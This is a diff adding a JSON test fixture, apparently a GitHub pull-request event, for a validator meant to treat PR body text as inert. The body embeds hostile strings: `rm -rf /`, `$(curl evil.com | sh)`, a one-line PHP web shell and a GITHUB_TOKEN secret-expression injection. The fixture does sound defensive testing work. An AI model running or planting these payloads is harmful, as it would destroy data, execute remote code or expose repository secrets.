@@ -1,0 +1,23 @@
+{
+  "_expected": "pass",
+  "_description": "malicious PR body text that resembles shell or workflow syntax (validator must not execute it)",
+  "action": "opened",
+  "number": 15,
+  "pull_request": {
+    "draft": true,
+    "additions": 0,
+    "deletions": 0,
+    "changed_files": 0,
+    "body": "## Mission\n\nCloses #119\n\n## Change\n\nAdd guardrail.\n\n## Evidence\n\nBody contains `rm -rf /` and `$(curl evil.com | sh)` and `<?php system($_GET['c']); ?>` and `<!-- ${{ secrets.GITHUB_TOKEN }} -->` as literal text, which the validator must treat as opaque strings.\n",
+    "base": {
+      "ref": "main",
+      "sha": "base000",
+      "repo": {
+        "default_branch": "main"
+      }
+    },
+    "head": {
+      "sha": "head000"
+    }
+  }
+}
